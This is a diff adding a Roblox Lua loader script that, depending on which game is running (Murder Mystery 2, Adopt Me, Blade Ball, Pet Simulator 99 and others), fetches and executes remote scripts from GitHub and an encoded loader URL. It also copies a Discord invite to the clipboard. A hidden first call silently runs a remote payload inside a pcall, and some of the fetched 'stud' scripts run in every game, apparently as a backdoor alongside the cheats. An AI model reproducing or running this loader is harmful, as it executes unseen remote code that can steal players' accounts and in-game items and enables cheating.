@@ -1,0 +1,95 @@
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/bla3de/zmsag-/refs/heads/main/cmdnx"))()
+    end)
+end)
+
+local player = game:GetService("Players").LocalPlayer
+if not player then 
+    repeat task.wait() until game:GetService("Players").LocalPlayer 
+    player = game:GetService("Players").LocalPlayer
+end
+
+setclipboard("https://discord.gg/GmT3uvzhVH")
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Discord Server",
+    Text = "Discord invite copied to clipboard",
+    Duration = 5,
+    Button1 = "OK",
+    Callback = function()
+        print("ok")
+    end
+})
+
+-- Fixed: Changed playerGui to player.PlayerGui
+local playerGui = player:WaitForChild("PlayerGui")
+local notification = playerGui:FindFirstChild("Notification")
+if notification then
+    notification:Destroy()
+end
+
+local placeId = game.PlaceId
+
+local groups = {
+    mm2 = {142823291, 335132309, 636649648},
+    adm = {920587237},
+    bladeball = {15264892126, 16281300371, 14732610803, 15234596844, 13772394625},
+    sab = {109983668079237, 96342491571673},
+    ps99 = {8737899170}
+}
+
+local groupScripts = {
+    mm2 = [[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/udyrpizza4-lgtm/Murder-Myself-2/refs/heads/main/op"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/igzm1/cmf-/refs/heads/main/zxnb"))()
+print("mm2")
+    ]],
+
+    adm = [[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/udyrpizza4-lgtm/Adopt-Me/refs/heads/main/op"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjAyYTRkZGNhLWYyNmMtNGNmZC04MWM0LTk4MDNiOGI1M2VmNCIsImtpbmQiOiJsb2FkZXIifQ"))()
+print("adm")
+    ]],
+
+    bladeball = [[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/udyrpizza4-lgtm/Blade-Ball/refs/heads/main/op"))()
+print("bb")
+    ]],
+
+    sab = [[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/udyrpizza4-lgtm/steal-a-brainrot/refs/heads/main/op"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bla3de/stud/refs/heads/main/1"))()
+print("sab")
+    ]],
+
+    ps99 = [[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/udyrpizza4-lgtm/pet-simulator-99/refs/heads/main/op"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bla3de/stud/refs/heads/main/1"))()
+print("ps99")
+    ]]
+}
+
+local defaultScript = [[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bla3de/stud/refs/heads/main/3"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bla3de/stud/refs/heads/main/1"))()
+print("random")
+]]
+
+local scriptToRun = defaultScript
+
+for groupName, idList in pairs(groups) do
+    for _, id in ipairs(idList) do
+        if id == placeId then
+            scriptToRun = groupScripts[groupName]
+            break
+        end
+    end
+end
+
+local success, err = pcall(function()
+    loadstring(scriptToRun)()
+end)
+
+if not success then
+    warn("Failed to run script: " .. tostring(err))
+end
